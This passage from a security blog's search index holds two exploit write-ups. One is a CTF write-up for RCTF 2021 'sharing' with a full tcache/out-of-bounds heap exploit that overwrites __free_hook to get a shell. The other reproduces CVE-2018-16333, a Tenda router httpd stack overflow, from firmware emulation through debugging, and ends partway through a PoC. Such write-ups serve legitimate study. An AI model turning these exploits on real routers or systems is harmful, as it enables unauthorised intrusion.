href="https://nocbtm.github.io/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-pwn-%E5%A4%8D%E7%8E%B0/#%E6%BC%8F%E6%B4%9E%E7%82%B9-2">https://nocbtm.github.io/2020/03/09/%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-pwn-%E5%A4%8D%E7%8E%B0/#%E6%BC%8F%E6%B4%9E%E7%82%B9-2</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF-WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>heap</tag>
      
      <tag>musl-libc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2021RCTF-sharing</title>
    <link href="/2021/10/02/2021RCTF-sharing/"/>
    <url>/2021/10/02/2021RCTF-sharing/</url>
    
    <content type="html"><![CDATA[<h2 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h2><p>赛后复现<code>2021 RCTF</code>中的sharing。</p><h2 id="0x1-功能分析"><a href="#0x1-功能分析" class="headerlink" title="0x1 功能分析"></a>0x1 功能分析</h2><ul><li>add：输入index和size，其中对index进行了检查（不能47）</li><li>edit：输入index和content，不对index进行检查，根据一个全局指针变量<code>ptr</code>来定位要写的堆块地址（<code>*(*(ptr + index * 0x10）+ 8)</code>)和要写入的大小size（<code>*(ptr + index * 0x10）</code>）,如果<code>size</code>不为0就进行写操作</li><li>show：输入index，不检查index，根据一个全局指针变量<code>ptr</code>来定位要写的堆块地址（<code>*(*(ptr + index * 0x10）+ 8)</code>)，如果<code>size</code>不为0就进行读操作。</li><li>move：依次输入index1和index2，在heap manager中，用index1的指针的值替换index2的指针的值，同时<code>free</code>掉index2代表的堆块。</li><li>减2：choice输入57005，先输入满足条件的hint（字符串长度为0x10字节，每4个字节的值相加等于0x2F767991），然后输入任意地址addr，可以将该地址处的值减2。（没用上就没仔细分析）</li></ul><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/pwn/struct.png" alt="image"></p><h2 id="0x2-利用思路"><a href="#0x2-利用思路" class="headerlink" title="0x2 利用思路"></a>0x2 利用思路</h2><ol><li>申请大的chunk，使其被释放时不会放到<code>tcache</code>，而是放到<code>unsorted bin</code>，然后再次申请它，利用脏数据泄露<code>libc</code>地址；</li><li>释放两个相同大小的chunk到tcache中，然后再申请后释放的chunk，从而利用脏数据得到第一次释放的chunk的地址，即堆地址；</li><li>利用没用对<code>idx</code>的检查，在申请的堆块中伪造管理堆块和指针数组，然后写<code>__free_hook</code>为<code>system</code>,从而通过释放堆块getshell。</li></ol><h2 id="0x3-Exp"><a href="#0x3-Exp" class="headerlink" title="0x3 Exp"></a>0x3 Exp</h2><figure class="highlight routeros"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></div></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-comment">#!/usr/bin/env python3</span><br><span class="hljs-comment"># -*- encoding: utf-8 -*-</span><br><br><span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;</span><br><span class="hljs-string">@文件        :exp.py</span><br><span class="hljs-string">@说明        :tcache + 数组越界</span><br><span class="hljs-string">@作者        :sh0ve1</span><br><span class="hljs-string">@防护</span><br><span class="hljs-string">    Arch:     amd64-64-little</span><br><span class="hljs-string">    RELRO:    Full RELRO</span><br><span class="hljs-string">    Stack:    Canary found</span><br><span class="hljs-string">    NX:       NX enabled</span><br><span class="hljs-string">    PIE:      PIE enabled</span><br><span class="hljs-string">&#x27;</span><span class="hljs-string">&#x27;&#x27;</span><br><br><span class="hljs-keyword">from</span> pwn import *<br>import pwnlib<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br><br><br>p = process(<span class="hljs-string">&#x27;./sharing&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;/home/sh0ve1/glibc-all-in-one/libs/2.27-3ubuntu1.4_amd64/libc-2.27.so&#x27;</span>)<br><br>def <span class="hljs-built_in">add</span>(idx,size):<br>    p.sendlineafter(<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;:&#x27;</span>,str(idx))<br>    p.sendlineafter(<span class="hljs-string">&#x27;:&#x27;</span>,str(size))<br><br>def move(<span class="hljs-keyword">From</span>,<span class="hljs-keyword">To</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;:&#x27;</span>,str(<span class="hljs-keyword">From</span>))<br>    p.sendlineafter(<span class="hljs-string">&#x27;:&#x27;</span>,str(<span class="hljs-keyword">To</span>))<br><br>def show(idx):<br>    p.sendlineafter(<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;: &#x27;</span>,str(idx))<br><br>def <span class="hljs-built_in">edit</span>(idx,content):<br>    p.sendlineafter(<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;:&#x27;</span>,str(idx))<br>    p.sendafter(<span class="hljs-string">&#x27;:&#x27;</span>,content)<br><br>log.success(<span class="hljs-string">&quot;******************leak libcbase *************************&quot;</span>)<br><span class="hljs-comment"># 单链表tcache_entry，也即tcache Bin的默认最大数量是64，</span><br><span class="hljs-comment"># 在64位程序中申请的最小chunk size为32，之后以16字节依次递增，所以size大小范围是0x20-0x410，也就是说我们必须要malloc size≤0x408的chunk</span><br><span class="hljs-built_in">add</span>(0,0x410)<br><span class="hljs-built_in">add</span>(1,0x410)<br>move(1,0) #<span class="hljs-attribute">idx</span>=0已经分别放到tcache和unsorted bin，由于heap manager中的地址已经被修改了，所以不存在UAF<br><span class="hljs-built_in">add</span>(2,0x410) # 再次申请，将其从unsorted bin中取出，利用脏数据泄露地址<br>show(2)<br><br>libcbase = u64(p.recv(6).ljust(8,b<span class="hljs-string">&#x27;\x00&#x27;</span>)) - 0x3ebca0<br>__free_hook = libcbase + libc.sym[<span class="hljs-string">&quot;__free_hook&quot;</span>]<span class="hljs-built_in"></span><br><span class="hljs-built_in">system </span>= libcbase + libc.sym[<span class="hljs-string">&quot;system&quot;</span>]<br>log.<span class="hljs-built_in">info</span>(<span class="hljs-string">&quot;libcbase: &quot;</span> + hex(libcbase))<br><br>log.success(<span class="hljs-string">&quot;******************leak heapbase *************************&quot;</span>)<br><span class="hljs-built_in">add</span>(3,0x100)<br><span class="hljs-built_in">add</span>(4,0x100)<br><span class="hljs-built_in">add</span>(5,0x100)<br><span class="hljs-built_in">add</span>(6,0x100)<br>move(4,3) # free 3<br>move(6,5) # free 5<br><span class="hljs-built_in">add</span>(7,0x100) # malloc 5<br>show(7) # 地址已被修改，不存在UAF，所以只能重新申请来泄露<br>heap = u64(p.recv(6).ljust(8,b<span class="hljs-string">&#x27;\x00&#x27;</span>))<br>log.<span class="hljs-built_in">info</span>(<span class="hljs-string">&quot;heap: &quot;</span> + hex(heap))<br><br>fake_heap_manager_chunk = p64(heap - 0x450 + 0x20) + p64(heap - 0x450 + 0x10) # <span class="hljs-attribute">idx</span>=1<br>fake_0x30_chunk = p64(heap - 0xe86260) + p64(0x0000000100000002) + p64(0x100) + p64(__free_hook)<br><br>fake_ptr = fake_heap_manager_chunk + fake_0x30_chunk<br><span class="hljs-built_in">edit</span>(1,fake_ptr) # idx = 443 = 0x1bb = (heap - 0x450 -heap_manager)/0x10 利用下标越界<br><span class="hljs-built_in">edit</span>(443,p64(system)) # 修改__free_hook为system<br><br><span class="hljs-built_in">add</span>(8,0x100)<br><span class="hljs-built_in">add</span>(9,0x100)<br><span class="hljs-built_in">edit</span>(8,<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>move(9,8)<br><br><span class="hljs-comment"># pwnlib.gdb.attach(p)</span><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="0x4-Reference"><a href="#0x4-Reference" class="headerlink" title="0x4 Reference"></a>0x4 Reference</h2><ul><li><a href="https://blog.rois.io/2021/rctf-2021-official-writeup-2/">https://blog.rois.io/2021/rctf-2021-official-writeup-2/</a></li><li><a href="https://ctf.njupt.edu.cn/700.html#sharing">https://ctf.njupt.edu.cn/700.html#sharing</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>CTF-WriteUp</category>
      
    </categories>
    
    
    <tags>
      
      <tag>heap</tag>
      
      <tag>tcache</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2018-16333复现</title>
    <link href="/2021/09/02/CVE-2018-16333/"/>
    <url>/2021/09/02/CVE-2018-16333/</url>
    
    <content type="html"><![CDATA[<h2 id="0x0-漏洞描述"><a href="#0x0-漏洞描述" class="headerlink" title="0x0 漏洞描述"></a>0x0 漏洞描述</h2><p>An issue was discovered on Tenda AC7 V15.03.06.44_CN, AC9 V15.03.05.19(6318)_CN, AC10 V15.03.06.23_CN, AC15 V15.03.05.19_CN, and AC18 V15.03.05.19(6318)_CN devices.</p><p>There is a buffer overflow vulnerability in the router’s web server. While processing the ssid parameter for a POST request, the value is directly used in a sprintf call to a local variable placed on the stack, which overrides the return address of the function, causing a buffer overflow.</p><h2 id="0x1-固件和相关工具"><a href="#0x1-固件和相关工具" class="headerlink" title="0x1 固件和相关工具"></a>0x1 固件和相关工具</h2><ul><li>US_AC15V1.0BR_V15.03.05.19_multi_TD01.bin</li><li>gdb、gdb-multiarch</li><li>ida 7.5</li><li>qemu-arm-static</li><li>python3</li></ul><h2 id="0x2-整体分析"><a href="#0x2-整体分析" class="headerlink" title="0x2 整体分析"></a>0x2 整体分析</h2><ul><li>file US_AC15V1.0BR_V15.03.05.19_multi_TD01.bin</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">US_AC15V1</span>.<span class="hljs-number">0</span>BR_V<span class="hljs-number">15.03.05.19</span>_multi_TD01.bin: u-boot legacy uImage, \<span class="hljs-number">002</span>, Linux/ARM, OS Kernel Image (lzma), <span class="hljs-number">10629120</span> bytes, Fri May <span class="hljs-number">26</span> <span class="hljs-number">02</span>:<span class="hljs-number">03</span>:<span class="hljs-number">05</span> <br><span class="hljs-attribute">2017</span>, Load Address: <span class="hljs-number">0</span>x80000000, Entry Point: <span class="hljs-number">0</span>xC0008000, Header CRC: <span class="hljs-number">0</span>x1FE383A9, Data CRC: <span class="hljs-number">0</span>xE67F312E<br></code></pre></td></tr></table></figure><ul><li>使用binwalk获取固件信息</li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">binwalk</span> <span class="hljs-string">US_AC15V1.0BR_V15.03.05.19_multi_TD01.bin</span><br><br><span class="hljs-string">DECIMAL</span>       <span class="hljs-string">HEXADECIMAL</span>     <span class="hljs-string">DESCRIPTION</span><br><span class="hljs-string">--------------------------------------------------------------------------------</span><br><span class="hljs-number">64</span>            <span class="hljs-number">0x40</span>            <span class="hljs-string">TRX</span> <span class="hljs-string">firmware</span> <span class="hljs-string">header,</span> <span class="hljs-string">little</span> <span class="hljs-string">endian,</span> <span class="hljs-attr">image size:</span> <span class="hljs-number">10629120</span> <span class="hljs-string">bytes,</span> <span class="hljs-attr">CRC32:</span> <span class="hljs-number">0xAB135998</span><span class="hljs-string">,</span> <span class="hljs-attr">flags:</span> <span class="hljs-number">0x0</span><span class="hljs-string">,</span> <span class="hljs-attr">version:</span> <span class="hljs-number">1</span><span class="hljs-string">,</span> <span class="hljs-attr">header size:</span> <span class="hljs-number">28</span> <span class="hljs-string">bytes,</span> <span class="hljs-attr">loader offset:</span> <span class="hljs-number">0x1C</span><span class="hljs-string">,</span> <span class="hljs-attr">linux kernel offset:</span> <span class="hljs-number">0x1C9E58</span><span class="hljs-string">,</span> <span class="hljs-attr">rootfs offset:</span> <span class="hljs-number">0x0</span><br><span class="hljs-number">92</span>            <span class="hljs-number">0x5C</span>            <span class="hljs-string">LZMA</span> <span class="hljs-string">compressed</span> <span class="hljs-string">data,</span> <span class="hljs-attr">properties:</span> <span class="hljs-number">0x5D</span><span class="hljs-string">,</span> <span class="hljs-attr">dictionary size:</span> <span class="hljs-number">65536</span> <span class="hljs-string">bytes,</span> <span class="hljs-attr">uncompressed size:</span> <span class="hljs-number">4585280</span> <span class="hljs-string">bytes</span><br><span class="hljs-number">1875608</span>       <span class="hljs-number">0x1C9E98</span>        <span class="hljs-string">Squashfs</span> <span class="hljs-string">filesystem,</span> <span class="hljs-string">little</span> <span class="hljs-string">endian,</span> <span class="hljs-string">version</span> <span class="hljs-number">4.0</span><span class="hljs-string">,</span> <span class="hljs-string">compression:xz,</span> <span class="hljs-attr">size:</span> <span class="hljs-number">8749996</span> <span class="hljs-string">bytes,</span> <span class="hljs-number">928</span> <span class="hljs-string">inodes,</span> <span class="hljs-attr">blocksize:</span> <span class="hljs-number">131072</span> <span class="hljs-string">bytes,</span> <span class="hljs-attr">created:</span> <span class="hljs-number">2017-05-26 02:03:03</span><br></code></pre></td></tr></table></figure><ul><li>使用binwalk提取固件</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">binwalk</span> -Me US_AC15V1.<span class="hljs-number">0</span>BR_V<span class="hljs-number">15.03.05.19</span>_multi_TD01.bin<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/CVE-2018-16333/1.png" alt="image"></p><ul><li>使用<code>file</code>指令查看漏洞文件<code>httpd</code>的文件信息</li></ul><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">file</span> .<span class="hljs-regexp">/bin/</span>httpd <br><br>.<span class="hljs-regexp">/bin/</span>httpd: ELF <span class="hljs-number">32</span>-bit LSB executable, ARM, EABI5 version <span class="hljs-number">1</span> (SYSV), dynamically linked, interpreter <span class="hljs-regexp">/lib/</span>ld-uClibc.so.<span class="hljs-number">0</span>, stripped<br></code></pre></td></tr></table></figure><ul><li>使用<code>checksec</code>指令查看文件的保护机制，可以发现<code>httpd</code>只开启了栈不可执行保护</li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">checksec</span> <span class="hljs-string">./bin/httpd</span><br><br>    <span class="hljs-attr">Arch:</span>     <span class="hljs-string">arm-32-little</span><br>    <span class="hljs-attr">RELRO:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">RELRO</span><br>    <span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><br>    <span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><br>    <span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8000)</span><br></code></pre></td></tr></table></figure><ul><li>漏洞定位：使用<code>ida</code>根据参数名<code>ssid</code>和常用于将数据复制到栈中的<code>strcpy</code>函数定位到函数<code>form_fast_setting_wifi_set</code></li></ul><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/CVE-2018-16333/2.png" alt="image"></p><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/CVE-2018-16333/3.png" alt="image"></p><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/CVE-2018-16333/4.png" alt="image"></p><blockquote><p>获取ssid的值之后，赋给局部变量src，然后没用任何检查地赋值给局部变量s[64]和dest[64]</p></blockquote><h2 id="0x3-环境修复"><a href="#0x3-环境修复" class="headerlink" title="0x3 环境修复"></a>0x3 环境修复</h2><ul><li>使用<code>qemu-arm-static</code>尝试运行<code>httpd</code></li></ul><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">sudo chroot .<span class="hljs-regexp">/ ./</span>qemu-arm-<span class="hljs-keyword">static</span> .<span class="hljs-regexp">/bin/</span>httpd<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/CVE-2018-16333/5.png" alt="image"></p><ul><li>使用<code>netstat -ano</code>发现服务没用启动，因此使用如下指令查看故障信息：</li></ul><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">sudo chroot .<span class="hljs-regexp">/ ./</span>qemu-arm-<span class="hljs-keyword">static</span> -strace .<span class="hljs-regexp">/bin/</span>httpd<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/CVE-2018-16333/6.png" alt="image"></p><blockquote><p>发现一直循环执行<code>ioctl(3,35093,-150997516,-150997532,1045432,-150997004)</code>,返回值都是-1，报错<code>No such device</code></p></blockquote><ul><li>根据字符串在程序中进行定位查找，然后根据循环推测出：网络检查不通过，所以一直循环检查网络</li></ul><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/CVE-2018-16333/7.png" alt="image"></p><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/CVE-2018-16333/8.png" alt="image"></p><blockquote><p>不知道它的代码逻辑，那就只能尝试看看patch，需要注意的是，patch前后的size一定要一样，如果不一样可以尝试使用<code>NOP</code>指令填充。</p></blockquote><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/CVE-2018-16333/9.png" alt="image"></p><ul><li>将patch后的文件改名为<code>httpd_patch_1</code>，并添加可执行权限，然后再次使用qemu执行</li></ul><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/CVE-2018-16333/10.png" alt="image"></p><ul><li>发现还是报错，根据报错信息在ida中进行查找</li></ul><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/CVE-2018-16333/11.png" alt="image"></p><blockquote><p>造成原因就说ConnectCfm函数的返回值不等于1，并且不知道ConnectCfm代码逻辑，所以只能再次尝试Patch</p></blockquote><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/CVE-2018-16333/12.png" alt="image"></p><blockquote><p>切记：Patch完之后，一定要<code>Edit</code>-&gt;<code>Patch Program</code>-&gt;<code>Apply Patches to input file ...</code>来真正地patch二进制文件，否则，二进制文件是没有被修改的。</p></blockquote><ul><li>将第二次patch后的文件改名为<code>httpd_patch_2</code>，并添加可执行权限，然后使用qemu执行</li></ul><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/CVE-2018-16333/13.png" alt="image"></p><ul><li>这次运行成功了，但是IP地址明显不对，所以我们还是需要查看一下程序是如何确定IP地址的，根据字符串“httpd listen ip &#x3D;”交叉引用定位到函数<code>sub_1b84c</code>，然后跟踪发现，IP地址是由该函数的第一个参数决定的，所以查看该函数的交叉引用，根据字符串“webs: Listening for HTTP requests at address”分析确定函数<code>sub_29818</code>,分析该函数发现IP地址由<code>g_lan_ip</code>决定，对其交叉引用，发现函数<code>sub_2E420</code>对其进行赋值操作。</li></ul><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/CVE-2018-16333/14.png" alt="image"></p><ul><li>到这里就懵了，因为不清楚函数<code>GetValue</code>的代码逻辑，所以不清楚怎么来修改<code>g_lan_ip</code>。在网上找到同系列路由器固件复现<a href="https://xz.aliyun.com/t/7357">文章</a>，得知函数逻辑是寻找<code>br0</code>这个网络接口的IP,并在这个ip进行监听。并给出两个解决方案：</li></ul><ol><li>对源程序进行patch,将<code>br0</code>这个接口更改为本机的<code>ens33</code>这个网卡；</li><li>在本机新建一个桥接网卡<code>br0</code></li></ol><ul><li>为了方便，就直接在本地创建一个名为<code>br0</code>的网卡。</li></ul><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs armasm">查看网卡：<br><span class="hljs-symbol">iwconfig</span> <br>在 Host 机上创建一个 br0 接口并分配 <span class="hljs-built_in">IP</span>：<br><span class="hljs-symbol">sudo</span> tunctl -t br0 -u `whoami`<br><span class="hljs-symbol">sudo</span> ifconfig br0 <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">32</span>.<span class="hljs-number">101</span>/<span class="hljs-number">24</span><br>这个<span class="hljs-built_in">IP</span>不一定要与虚拟机的<span class="hljs-built_in">IP</span>在同一局域网<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/CVE-2018-16333/15.png" alt="image"></p><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/CVE-2018-16333/16.png" alt="image"></p><ul><li>qemu仿真成功，并且地址真的是网卡<code>br0</code>的地址</li></ul><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/CVE-2018-16333/17.png" alt="image"></p><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/CVE-2018-16333/18.png" alt="image"></p><h2 id="0x4-动态调试"><a href="#0x4-动态调试" class="headerlink" title="0x4 动态调试"></a>0x4 动态调试</h2><ul><li><code>gdb-multiarch</code>脚本script:</li></ul><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-keyword">set</span> architecture <span class="hljs-comment">arm</span><br><span class="hljs-keyword">set</span> <span class="hljs-comment">endian little</span><br>target <span class="hljs-comment">remote:1234</span><br>b <span class="hljs-comment">*0x0002E420</span><br>b <span class="hljs-comment">*0x00066EE0</span><br>b <span class="hljs-comment">*0x00067080</span><br>b <span class="hljs-comment">*0x00067094</span><br></code></pre></td></tr></table></figure><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xl"><span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-title">x0002E420</span> -&gt;</span> sub_2E420<br><span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-title">x00066EE0</span> -&gt;</span> form_fast_setting_wifi_set<br><span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-title">x00067080</span> -&gt;</span> first strcpy<br><span class="hljs-number">0</span><span class="hljs-function"><span class="hljs-title">x00067094</span> -&gt;</span> second strcpy<br></code></pre></td></tr></table></figure><ul><li>依次执行以下指令：</li></ul><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle">sudo chroot .<span class="hljs-regexp">/ ./</span>qemu-arm-<span class="hljs-keyword">static</span> -g <span class="hljs-number">1234</span> .<span class="hljs-regexp">/bin/</span>httpd_patch_2<br>gdb-multiarch .<span class="hljs-regexp">/bin/</span>httpd_patch_2 -x script<br></code></pre></td></tr></table></figure><ul><li><p>在<code>gdb</code>中，使用指令<code>c</code>执行到服务开启，然后可以<code>POST</code>方式访问<code>http://192.168.32.101/goform/fast_setting_wifi_set</code>,传参<code>ssid=xxxx</code></p></li><li><p>在一篇<a href="https://cq674350529.github.io/2020/05/09/%E6%8A%80%E5%B7%A7misc/">博客</a>了解到在仿真的程序中又调用execve()来运行其他程序时，会默认会使用x86&#x2F;x86_64架构的ld来加载程序。</p></li></ul><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs gradle">查看主机系统上的qemu-arm文件<br>cat <span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/fs/</span>binfmt_misc/qemu-arm <br>enabled<br>interpreter <span class="hljs-regexp">/usr/</span>bin/qemu-arm-<span class="hljs-keyword">static</span><br>flags: OC<br>offset <span class="hljs-number">0</span><br>magic <span class="hljs-number">7</span>f454c4601010100000000000000000002002800<br>mask ffffffffffffff00fffffffffffffffffeffffff<br><br>根据interpreter的路径，在路由器文件系统中相同路径下复制一个qemu-arm-<span class="hljs-keyword">static</span>文件即可<br></code></pre></td></tr></table></figure><ul><li>动态调试总结</li></ul><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs nsis"><span class="hljs-number">1</span>. sub_2E420函数执行完成时，服务开启，等待客户端进行访问<br><span class="hljs-number">2</span>. 访问上述URL后，会执行form_fast_setting_wifi_set函数,触发栈溢出漏洞<br><span class="hljs-number">3</span>. 漏洞利用是在第一个<span class="hljs-keyword">strcpy</span>处<br><span class="hljs-number">4</span>. form_fast_setting_wifi_set函数地栈帧及利用思路如下图<br><span class="hljs-number">5</span>. 传输的payload中必须不存在 \x00 字节，否则会被<span class="hljs-keyword">strcpy</span>截断,导致出错<br><span class="hljs-number">6</span>. 根据栈帧可知，第一次的<span class="hljs-keyword">strcpy</span>如果要溢出到返回地址，会覆盖第二次的<span class="hljs-keyword">strcpy</span>的参数dest。因此需要用可读内存的地址覆盖src指针。<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sh0ve1/Images/master/CVE-2018-16333/19.png" alt="image"></p><h2 id="0x5-Exploit"><a href="#0x5-Exploit" class="headerlink" title="0x5 Exploit"></a>0x5 Exploit</h2><ul><li>Poc</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import requests<br><span class="hljs-keyword">from</span> pwn import *<br><br>cmd = b<span class="hljs-string">&quot;ls /bin&quot;</span><br><span class="hljs-comment"># cmd = b&quot;echo $PATH&quot;</span><br><br>libc_base = 0xf659c000<br><span class="hljs-built_in"></span><br><span class="hljs-built_in">system </span>= libc_base + 0x1a20f4<br>readable_addr = libc_base + 0x64144 # -&gt; <span 